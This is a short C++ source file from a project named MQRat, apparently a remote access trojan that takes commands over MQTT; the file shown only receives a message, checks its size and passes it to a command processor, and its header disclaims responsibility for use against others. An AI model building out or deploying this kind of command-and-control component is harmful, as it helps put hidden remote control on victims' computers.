/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#include <string>
#include <thread>
#include "command_dispatcher.hpp"
#include "command_processor.hpp"
#include "log.hpp"

using namespace std;

CommandDispatcher::CommandDispatcher(MQTTClient_message *msg, MqttClient *client)
{
    this->message = msg;
    this->client = client;
}

void CommandDispatcher::setMessage(MQTTClient_message *new_msg)
{
    this->message = new_msg;
}

void CommandDispatcher::Dispatch()
{
    // Check command size
    if(message->payloadlen > MAX_CMD_SIZE) {
        Log::LogError("Too big command size: " + to_string(message->payloadlen));
        return;
    }

    string command = string(reinterpret_cast<char*>(message->payload));
    CommandProcessor cp(command, this->client);

    // Analyse command syntax
    cp.Process();
}
